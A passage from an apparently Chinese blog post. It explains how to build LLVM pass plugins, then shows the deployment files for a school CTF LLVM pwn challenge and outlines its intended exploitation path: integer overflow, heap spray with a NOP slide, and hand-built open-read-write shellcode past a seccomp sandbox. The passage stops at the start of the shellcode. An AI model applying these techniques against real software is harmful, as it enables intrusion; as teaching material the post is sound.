id="生成和使用-so的pass编写方式"><a href="#生成和使用-so的pass编写方式" class="headerlink" title="生成和使用.so的pass编写方式"></a>生成和使用.so的pass编写方式</h4><p>主要参考<a href="https://bbs.kanxue.com/thread-257665.htm">该文章</a>及旧版的<a href="https://llvm.org/docs/WritingAnLLVMPass.html#setting-up-the-build-environment">Writing an LLVM Pass</a></p><p>在llvm&#x2F;lib&#x2F;Transforms目录下创建文件夹MyPass</p><p>在MyPass文件夹中创建CMakeLists.txt和MyPass.cpp</p><p>llvm&#x2F;lib&#x2F;Transforms&#x2F;MyPass&#x2F;CMakeLists.txt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">add_llvm_library( LLVMMyPass MODULE BUILDTREE_ONLY<br>  MyPass.cpp<br><br>  DEPENDS<br>  intrinsics_gen<br>  PLUGIN_TOOL<br>  opt<br>  )<br></code></pre></td></tr></table></figure><p>llvm&#x2F;lib&#x2F;Transforms&#x2F;MyPass&#x2F;MyPass.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><br><span class="hljs-comment">// only needed for printing</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;MyPass&gt; &#123;<br><br>  <span class="hljs-comment">// The first argument of the run() function defines on what level</span><br>  <span class="hljs-comment">// of granularity your pass will run (e.g. Module, Function).</span><br>  <span class="hljs-comment">// The second argument is the corresponding AnalysisManager</span><br>  <span class="hljs-comment">// (e.g ModuleAnalysisManager, FunctionAnalysisManager)</span><br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span> </span>&#123;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;MyPass in function: &quot;</span> &lt;&lt; F.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>() &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// Here goes what you want to do with a pass</span><br><br>    <span class="hljs-comment">// Assuming you did not change anything of the IR code</span><br>    <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>  &#125;<br>&#125;;<br>&#125;<br><br><span class="hljs-comment">// This part is the new way of registering your pass</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ::<span class="hljs-function">llvm::PassPluginLibraryInfo LLVM_ATTRIBUTE_WEAK </span><br><span class="hljs-function"><span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    LLVM_PLUGIN_API_VERSION, <span class="hljs-string">&quot;MyPass&quot;</span>, <span class="hljs-string">&quot;v0.1&quot;</span>,<br>    [](PassBuilder &amp;PB) &#123;<br>      PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>        [](StringRef Name, FunctionPassManager &amp;FPM,<br>        ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>          <span class="hljs-keyword">if</span>(Name == <span class="hljs-string">&quot;my-pass&quot;</span>)&#123;  <span class="hljs-comment">//my-pass是使用opt工具加载时的名称</span><br>            FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">MyPass</span>());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>在llvm&#x2F;lib&#x2F;Transforms&#x2F;CMakeLists.txt中添加</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add_subdirectory</span><span class="hljs-params">(MyPass)</span></span><br></code></pre></td></tr></table></figure><p>最后来到llvm构建时创建的build目录中进行构建，只会构建新增的部分，所以构建很快</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./build.sh<br></code></pre></td></tr></table></figure><p>生成的.so文件在LLVM&#x2F;llvm-project&#x2F;build&#x2F;lib目录中</p><p>现在就可以通过opt工具来使用pass了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">opt -disable-output \<br>-load-pass-plugin=&#x27;/home/op1n/LLVM/llvm-project/build/lib/LLVMMyPass.so&#x27; \<br>-passes=&quot;my-pass&quot; \<br>&#x27;/home/op1n/LLVM/llvm_pass/ir_for_test/helloworld.ll&#x27;<br></code></pre></td></tr></table></figure><h3 id="使用clang源码外构建"><a href="#使用clang源码外构建" class="headerlink" title="使用clang源码外构建"></a>使用clang源码外构建</h3><p>在源码外直接使用clang进行构建最方便</p><p>Pass源码，可以在任意目录，只要有源文件即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><br><span class="hljs-comment">// only needed for printing</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;MyPass&gt; &#123;<br><br>  <span class="hljs-comment">// The first argument of the run() function defines on what level</span><br>  <span class="hljs-comment">// of granularity your pass will run (e.g. Module, Function).</span><br>  <span class="hljs-comment">// The second argument is the corresponding AnalysisManager</span><br>  <span class="hljs-comment">// (e.g ModuleAnalysisManager, FunctionAnalysisManager)</span><br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span> </span>&#123;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;kkk in function: &quot;</span> &lt;&lt; F.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>() &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// Here goes what you want to do with a pass</span><br><br>    <span class="hljs-comment">// Assuming you did not change anything of the IR code</span><br>    <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>  &#125;<br>&#125;;<br>&#125;<br><br><span class="hljs-comment">// This part is the new way of registering your pass</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ::<span class="hljs-function">llvm::PassPluginLibraryInfo LLVM_ATTRIBUTE_WEAK</span><br><span class="hljs-function"><span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    LLVM_PLUGIN_API_VERSION, <span class="hljs-string">&quot;MyPass&quot;</span>, <span class="hljs-string">&quot;v0.1&quot;</span>,<br>    [](PassBuilder &amp;PB) &#123;<br>      PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>        [](StringRef Name, FunctionPassManager &amp;FPM,<br>        ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>          <span class="hljs-keyword">if</span>(Name == <span class="hljs-string">&quot;kkk&quot;</span>)&#123;<br>            FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">MyPass</span>());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用如下命令构建</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared MyPass.cpp -o LLVMMyPass.so `llvm-config --ldflags`<br></code></pre></td></tr></table></figure><p>运行Pass，和生成.so的源码集成编译一样，需要so文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">opt -disable-output \<br>-load-pass-plugin=&#x27;./LLVMMyPass.so&#x27; \<br>-passes=&quot;my-pass&quot; \<br>&#x27;/home/op1n/LLVM/llvm_pass/ir_for_test/helloworld.ll&#x27;<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kkk <span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span>: foo<br><span class="hljs-title function_">kkk</span> <span class="hljs-title function_">in</span> <span class="hljs-title function_">function</span>: bar<br></code></pre></td></tr></table></figure><h3 id="pass编写"><a href="#pass编写" class="headerlink" title="pass编写"></a>pass编写</h3><p><a href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_3">这篇文章</a>有一些常用LLVM语法，更多更详细的内容在官方手册。</p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>测试clang生成的.ll文件时，需要删去 ‘attributes #0’ 行的’optnone’一词。</p><p>或在参数中添加-disable-O0-optnone</p><p>例：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">clang -Xclang -disable-O<span class="hljs-number">0</span>-<span class="hljs-keyword">optnone</span> -S -emit-llvm test.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p>否则pass不会生效</p><h2 id="校赛LLVM-PWN出题记录"><a href="#校赛LLVM-PWN出题记录" class="headerlink" title="校赛LLVM PWN出题记录"></a>校赛LLVM PWN出题记录</h2><h3 id="1-题目部署"><a href="#1-题目部署" class="headerlink" title="1.题目部署"></a>1.题目部署</h3><p>租的是ubuntu2004阿里云服务器</p><p>主要使用xinetd部署,可以看<a href="https://blog.csdn.net/Myon5/article/details/131763593">这篇文章</a></p><p>当然实际部署的时候需要做很多修改,以下是成功部署的文件和部署过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ctf_xinetd<span class="hljs-comment"># ls</span><br>bin  ctf.xinetd  Dockerfile  README.md  start.sh<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">/ctf_xinetd/bin# <span class="hljs-keyword">ls</span><br><span class="hljs-built_in">exp</span>  flag  lib  optimizer.<span class="hljs-keyword">so</span>  <span class="hljs-keyword">opt</span>  run.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p>lib文件夹是opt运行pass需要的动态链接库，exp是base64解码后的base64输入</p><p>基本思路是用户输入的数据经过base64解码后存在exp(ir代码)，然后运行opt使用题目的pass来优化ir，这些操作都在run.sh完成</p><p>ctf.xinetd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">service ctf<br>&#123; <br>    disable = no<br>    socket_type = stream<br>    protocol    = tcp<br>    wait        = no<br>    user        = root<br>    type        = UNLISTED<br>    port        = 8888<br>    bind        = 0.0.0.0<br>    server      = /usr/sbin/chroot<br>    # replace helloworld to your program<br>    server_args = --userspec=1000:1000 /home/ctf ./run.sh<br>    banner_fail = /etc/banner_fail<br>    # safety options<br>    per_source  = 10 # the maximum instances of this service per source IP address<br>    rlimit_cpu  = 20 # the maximum number of CPU seconds that the service may use<br>    #rlimit_as  = 1024M # the Address Space resource limit for the service<br>    #access_times = 2:00-9:00 12:00-24:00<br>&#125;<br></code></pre></td></tr></table></figure><p>Dockerfile</p><p>主要是在镜像中的bin目录下添加了base64命令和echo命令，同时给了run.sh和ctf用户rwx权限</p><p>1.base64命令用户解决.ll文件的传输问题。.ll文件有多行，server不方便读取。base64加密后的数据只有一行，shell脚本中一句read就能读取，读取后再base64解码即可。</p><p>2.这里不知道为什么，ctf并不在&#x2F;home&#x2F;ctf的所属组中，改了chown命令也没用，而且要在ctf用户下创建exp文件需要写权限，只能选择了chmod -R 777 &#x2F;home&#x2F;ctf，给了其他用户rwx权限。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 xinetd </span><br><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m ctf </span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cp</span> -R /usr/lib* /home/ctf </span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/ctf/dev &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mknod</span> /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> 666 /home/ctf/dev/*</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/ctf/bin &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/cat /home/ctf/bin &amp;&amp;\</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /usr/bin/base64 /home/ctf/bin &amp;&amp;\</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /bin/echo /home/ctf/bin </span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./bin/ /home/ctf/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="language-bash">     <span class="hljs-built_in">chmod</span> -R 777 /home/ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> 744 /home/ctf/flag &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> 777 /home/ctf/run.sh    </span><br><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>run.sh</p><p>由于docker接收输入时最多一次性接收4096个字节，而exp长度大约为10000字节，所以循环读入，当用户输入ok时停止输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>  <br>echo &quot;input your base64 encoded ir(.ll) :&quot;<br><br>input=&quot;&quot;<br>while true; do<br>    read -r -n 4096 segment<br>    if [ &quot;$segment&quot; == &quot;ok&quot; ]; then<br>        break<br>    else<br>        input+=&quot;$segment&quot;<br>    fi<br>done<br><br>echo &quot;$input&quot; | base64 -d &gt; exp<br>cat ./exp<br>./opt -disable-output \<br>    -load-pass-plugin=&#x27;./optimizer.so&#x27; \<br>    -passes=&quot;optimizer&quot; \<br>    &#x27;./exp&#x27;<br><br></code></pre></td></tr></table></figure><h4 id="docker建立镜像及测试"><a href="#docker建立镜像及测试" class="headerlink" title="docker建立镜像及测试"></a>docker建立镜像及测试</h4><p>使用Dockerfile创建镜像</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">docker build -t <span class="hljs-string">&quot;test&quot;</span> .<br></code></pre></td></tr></table></figure><p>启动镜像,这里8888对应ctf.xinetd和Dockerfile中expose的端口，nc时本地和远程都使用8090端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d -p &quot;0.0.0.0:8090:9999&quot;  -h &quot;test&quot; --name=&quot;test&quot; test<br></code></pre></td></tr></table></figure><p>查看所有镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker ps -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">8090</span><br></code></pre></td></tr></table></figure><p>把.ll文件打包成一行base64</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">base64 test.<span class="hljs-keyword">ll</span> | <span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; <span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure><p>进入容器排查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it 容器<span class="hljs-built_in">id</span> /bin/bash<br></code></pre></td></tr></table></figure><p>停止&#x2F;再次启动&#x2F;删除镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker stop 容器<span class="hljs-built_in">id</span><br>docker start 容器<span class="hljs-built_in">id</span><br>docker <span class="hljs-built_in">rm</span> 容器<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="2-考点"><a href="#2-考点" class="headerlink" title="2.考点"></a>2.考点</h3><h4 id="对llvm框架基本的认识"><a href="#对llvm框架基本的认识" class="headerlink" title="对llvm框架基本的认识"></a>对llvm框架基本的认识</h4><p>需要分析的是pass编译出来的so文件，opt在运行过程中会加载so</p><p>新版passmanager怎么找分析时的入口函数？在旧版passmanager中找runonfunction函数就可以了，新版中大概是这个样子，本题可以直接查找字符串交叉引用</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">llvm::PreservedAnalyses *__fastcall `anonymous <span class="hljs-keyword">namespace</span><span class="hljs-number">&#x27;</span>::easyheap::run<br></code></pre></td></tr></table></figure><h4 id="本地动态调试"><a href="#本地动态调试" class="headerlink" title="本地动态调试"></a>本地动态调试</h4><p>本地动态调试需要先启动gdb再set args，同时漏洞点是在so库中的，需要一步一步调到目标so中的目标函数。</p><p>首先</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">gdb</span> <span class="hljs-meta">opt</span><br></code></pre></td></tr></table></figure><p>进入gdb后</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> args -disable-output <span class="hljs-attribute">-load-pass-plugin</span>=<span class="hljs-string">&#x27;./optimizer.so&#x27;</span> <span class="hljs-attribute">-passes</span>=<span class="hljs-string">&quot;optimizer&quot;</span> <span class="hljs-string">&#x27;./test.ll&#x27;</span><br></code></pre></td></tr></table></figure><p>在main函数下断点</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure><p>用ida查看opt的main函数，跳过前面一大堆init函数，从lea开始调试，经过一次call就vmmap查看有没有pass的so库</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918001151.png" alt="QQ截图20230918001151"></p><p>最终发现在</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">llvm::cl::ParseCommandLineOptions<br></code></pre></td></tr></table></figure><p>函数中导入了pass的so库，从函数名也可以判断该函数是用来解析命令行参数的</p><p>那么，只要在该函数下断点即可</p><p>然后调到pass的入口函数</p><p>通过vmmap可以看到pass的so文件的基址</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918003125.png" alt="QQ截图20230918003125"></p><p>如图，这里基址是0x7ffff7fae000，用ida打开so文件，可以找到入口函数相对基址的偏移</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918003254.png" alt="QQ截图20230918003254"></p><p>如图，偏移是EC70</p><p>相加后得到入口函数地址为0x7FFFF7FBCC70，直接在该地址下断点即可</p><p>调到入口函数后就和正常pwn题一样啦</p><p>tips:图中演示的文件不是最终的题目文件，偏移可能不一样</p><h4 id="整型溢出"><a href="#整型溢出" class="headerlink" title="整型溢出"></a>整型溢出</h4><p>buy函数存在整型溢出。在buy时可以buy负数的chunk，money会减去这个负数，导致无限money。</p><h4 id="堆喷"><a href="#堆喷" class="headerlink" title="堆喷"></a>堆喷</h4><p>在无限money的基础上，可以申请任意大小的chunk并编辑其中内容。</p><p>locate可以跳转到一个相对chunk基址有一定随机偏移的地址执行，通过调整buy的chunk的大小并调试可以使loacte随机执行的范围与chunk的范围有交叉，那么此时就有概率从chunk开始执行。</p><p>采用堆喷的思想，在要执行的shellcode前添加滑块如nop，填满chunk，那么随机执行到chunk中时，就可以滑到shellcode执行，否则就要正好随机执行到shellcode首字节，这是万分之一级别的概率。</p><p>给了buy的chunk地址，可以减少调试难度，同时也可以发现malloc的参数为负数时，本地或许可以申请到chunk，但是remote时会申请失败,需要在chunk构造上做调整。</p><p>另外，在locate中开启了沙箱，禁用了execve和execveat，所以要orw，这又涉及另一个问题 — 解析字符串时会被\x00截断，所以要手搓orw_shellcode。</p><p>优化后的shellcode如下，35字节，需要手动把可见字符改成\x的形式否则会把&#x2F;x12和3解析成0x123</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(<br><span 